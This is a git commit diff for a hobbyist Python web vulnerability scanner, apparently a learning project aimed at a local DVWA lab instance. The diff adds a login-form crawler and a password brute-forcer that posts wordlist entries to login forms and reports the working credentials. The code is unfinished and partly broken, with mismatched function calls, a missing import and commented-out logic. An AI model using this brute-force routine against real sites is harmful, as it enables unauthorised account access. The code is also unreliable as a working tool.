1837bda97e931b6b052ad40a18fb24031d14f47d
benQEMUKali <benro2211@gmail.com>
2022-05-02 22:30:27 -0600

    wrap poster in vulnscan, data dict in progress

--- vulnScan.py
+++ vulnScan.py
@@ -1,16 +1,14 @@
 from spider import Spider
 from bs4 import BeautifulSoup
 import argparse
-import passwordPoster as pp
 from urllib.parse import urljoin
 
 class Args:
     def __init__(self):
         parser = argparse.ArgumentParser()
-        parser.add_argument('-u','--url',dest = 'url', help = 'Enter target URL.')     
+        parser.add_argument('-u','--url',dest = 'url', help = 'Enter target URL.')
         options = parser.parse_args()
         self.url = options.url
-        
 
 class Vulnscan:
 	def __init__(self,url):
@@ -20,18 +18,18 @@ class Vulnscan:
 
 	def runSpider(self): # run spider will test the site and return list of what it can access
 		self.spider.run()
-		self.storeLinks = self.spider.storeLinks 
+		self.storeLinks = self.spider.storeLinks
 		if len(self.storeLinks) > 0:
 			return self.storeLinks
 		else:
 			print('List is empty, check link and try again')
-	
+
 	def postData(self):
 		html = self.spider.reqGet(self.url)
 		bsparse = BeautifulSoup(html,"html.parser")
 		postData = {}
 		print(bsparse)
-	
+
 	def sessionSpider(self,lst): # session spider will take a list and try to login and gather more links
 		credsList = []
 		for link in lst:
@@ -42,20 +40,52 @@ class Vulnscan:
 				forms = bs.findAll('form') # use forms even if one item , list
 				if len(forms) == 1:
 					action = forms[0].get('action')
-					actionUrl = urljoin(link,action)
-					#print(url)
-				print(self.returnCreds(actionUrl))
-				
+					if 'login' in action:
+						form = forms[0]
+						action = form.get('action')
+						fullurl = (urljoin(link, action))
+						inputList = form.findAll('input')
+						#print(inputList)
+						print(fullurl)
+						postData = {}
+						for i in inputList:
+							print(i.get('name')) # pass in the name of each input into dict of data
+							#print(i.get('type'))
+							#print(i.get('value'))
+						# 	if inputType == 'text':
+						# 		inputValue = 'test'
+						# 	postData[inputName] = inputValue
+						
 
 				
-	def returnCreds(self,url): #uses post script to get creds, either returns creds dictionary or password ot found (None)
-		return pp.post(url)
-	
+				# print(link)
+				# if len(forms) == 1:
+				# 	action = forms[0].get('action')
+				# 	actionUrl = urljoin(link,action)
+				# 	#print(url)
+				# print(self.returnCreds(actionUrl))
+
 	def login(self,url=None):
 		if url == None:
 			url = self.url
 		response = self.spider.session.post(url,data=self.returnCreds(url))
 		return response.status_code, BeautifulSoup(response.content,"html.parser")
+	
+	def returnCreds(self,url,user,userField='username',passwordField='password',submitField='Login'):
+		data = {
+		userField: user, #name="username"
+		passwordField: "", #name="blah", use with password list
+		submitField: "submit" #name = "blah"
+		}
+		with open('/opt/wordlists/passwords.txt','r') as rf:
+				for password in rf:
+					password = password.strip()
+					data['password'] = password
+					resp = requests.post(url,data = data,timeout=5) #http://192.168.86.115/dvwa/login.php, passing in data dictionary to post request
+					if b'Login failed' not in resp.content and b'Authentication Error' not in resp.content:#<div class="message">Login failed</div>, if password is successful:
+						return (f'URL: {url}\nStatus code: {resp.status_code}\nCredentials: {data}\n')
+					
+				return (f'Password not found')
 
 
 #########################################################RUN#######################################################
